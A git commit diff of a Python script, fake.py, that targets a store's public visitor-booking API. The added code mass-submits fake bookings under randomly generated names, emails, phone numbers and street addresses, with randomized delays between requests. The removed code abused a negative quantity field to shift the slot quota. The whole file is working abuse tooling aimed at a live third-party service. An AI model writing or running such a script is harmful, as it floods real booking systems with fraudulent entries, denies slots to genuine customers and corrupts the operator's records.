a6bf5e957f1344bd933d0410c39896695f8f1395
k1m0ch1 <yahya.kimochi@gmail.com>
2021-04-20 21:26:40 +0700

    add faker

--- fake.py
+++ fake.py
@@ -1,4 +1,5 @@
 import sys
+import time
 import string
 import random
 
@@ -16,22 +17,52 @@ headers = {
     "Origin": "https://ikea-booking.lenna.ai"
 }
 
-body_fake = {
+body = {
     "name": ''.join(random.choice(string.ascii_uppercase) for _ in range(10)),
     "phone_number": f"+628{''.join(random.choice(string.digits) for _ in range(10))}",
     "email": f"{''.join(random.choice(string.ascii_uppercase) for _ in range(10))}@gmail.com",
-    "slot_open":"2021-04-15 8:00:00+00",
-    "slot_close":"2021-04-15 11:00:00+00",
+    "slot_open":"2021-04-20 8:00:00+00",
+    "slot_close":"2021-04-28 11:00:00+00",
     "date": "",
     "store_name":"IKEA Kota Baru Parahyangan",
     "store_id": 2,
     "slot_id": 0,
-    "qty": 0,
-    "age": f"+628{''.join(random.choice(string.digits) for _ in range(2))}",
+    "qty": random.randint(2, 5),
+    "age": f"40{''.join(random.choice(string.digits) for _ in range(3))}",
     "address": ''.join(random.choice(string.ascii_uppercase) for _ in range(25))
 }
 
-body_fake['date'] = input("tanggal (YYYY-MM-DD) : ")
+def reloadBody(body):
+    dataSet = open("name.txt", "r")
+    dataName = [ name.split("\n")[0] for name in dataSet ]
+    dataSet = open("word.txt", "r")
+    dataWord = [ item.split("\n")[0] for item in dataSet ]
+    dataSpecChar = ["", ".", "_", "-"]
+    dataStreetFirst = ["Jalan ", "jl. ", "gg. ", "gang "]
+    body['name'] = dataName[random.randint(0, len(dataName)-1)]
+    body['email'] = f"{body['name']}{dataSpecChar[random.randint(0, len(dataSpecChar)-1)]}{dataWord[random.randint(0, len(dataWord)-1)]}@gmail.com"
+
+    dataSet = open("street.txt", "r")
+    dataStreet = [ item.split("\t")[0] for item in dataSet ]
+    maxNamaJalan = random.randint(2, 4)
+    namaJalan = []
+    for i in range(0, maxNamaJalan):
+        while True:
+            tmp = dataStreet[random.randint(0, len(dataSpecChar)-1)]
+            if len(namaJalan) > 0:
+                if tmp not in namaJalan[len(namaJalan)-1]:
+                    namaJalan.append(tmp)
+                    break
+            else:
+                namaJalan.append(tmp)
+    body['address'] = f"{dataStreetFirst[random.randint(0,1)]} {''.join(namaJalan)} No {''.join(random.choice(string.digits) for _ in range(3))}"
+    body['qty'] = random.randint(2, 5)
+    return body
+
+if len(sys.argv) > 1:
+    body['date'] = str(sys.argv[1])
+else:
+    body['date'] = input("tanggal (YYYY-MM-DD) : ")
 
 def checkDate(date, headers) -> dict:
     checkdate = requests.get(f"https://ikea-booking.lenna.ai/backend/public/api/public/list/2/{date}", headers=headers)
@@ -67,16 +98,6 @@ for jadwal in dataResponse['data']:
     print(f"{jadwal['name']}. {waktu_buka} s/d {waktu_tutup} BOOKED {jadwal['booked']} QUOTA {jadwal['qty']}") 
 kunjungan = input("pilih kunjungan jam? (1/2/3/4) ")
 
-body['name'] = input("Nama: ")
-body['phone_number'] = input("Phone Number: ")
-body['email'] = input("email (WAJIB): ")
-body['age'] = input("kodepos: ")
-body['address'] = input("alamat: ")
-body['qty'] = int(input("kunjungan erapa orang? 1-5: "))
-if body['qty'] < 0 or body['qty'] > 5:
-    print("1-5 orang bapak, ulangi lagi ya")
-    sys.exist(1)
-
 jadwal = dataResponse['data'][int(kunjungan)-1]
 booked = jadwal['booked']
 quota = jadwal['qty']
@@ -86,22 +107,27 @@ if int(kunjungan) < 0 or int(kunjungan) > 4:
     sys.exit(1)
 
 body['slot_id'] = int(kunjungan) + 23
-
-if booked >= quota:
-    fake_qty = (quota-booked)-body['qty']
-    body_fake['qty'] = fake_qty
-    body_fake['slot_id'] = body['slot_id']
-    print(f"The Booked is full {booked} and I will decrese the quota by {fake_qty*-1} so the quota will be {quota-body['qty']}")
-    print(f"\n I will send this body request \n {body_fake} \n")
-    fake_book = requests.post("https://ikea-booking.lenna.ai/backend/public/api/public/visitor", headers=headers, json=body_fake)
+print(f"book for {body['date']} currently {booked} (max {quota})")
+loop = input("how many data you want to send? ")
+interval = input("do you want to send interval second? (Y/N) ")
+min_sec = 0 if interval.lower() == 'n' else int(input("min second? "))
+max_sec = 1 if interval.lower() == 'n' else int(input("max second? "))
+qty_custom = input("do you want custom qty in the first? (Y/N) ")
+for index, loops in enumerate(range(0, int(loop))):
+    body = reloadBody(body)
+    if index == 0 and qty_custom.lower() != 'n':
+        body['qty'] = int(input("how many?"))
+    print(f"\n{body}\n")
+    fake_book = requests.post("https://ikea-booking.lenna.ai/backend/public/api/public/visitor", headers=headers, json=body)
     if fake_book.status_code != 200:
         print(f"{fake_book.status_code} Can't create the fake book")
         print(fake_book.text)
-        sys.exit(1)
+        # sys.exit(1)
+        continue
+    print(f"\nBooked Success with code {fake_book.json()['data']['code']} you can access your QRCODE from here : https://ikea-booking.lenna.ai/confirm/{fake_book.json()['data']['code']} ")
     checkdate = checkDate(body['date'], headers)
     jadwal = checkdate['data'][int(kunjungan)-1]
-    print(f"Now the booked value is {jadwal['booked']}")
-    booking(body, headers)
-else:
-    print(f"The Booked is free {booked} with quota {body['qty']} I will book for you")
-    booking(body, headers)
+    print(f"Now the booked value is {jadwal['booked']} (max {jadwal['qty']})")
+    wait = random.randint(min_sec, max_sec)
+    print(f"lets wait for {wait} second")
+    time.sleep(wait)
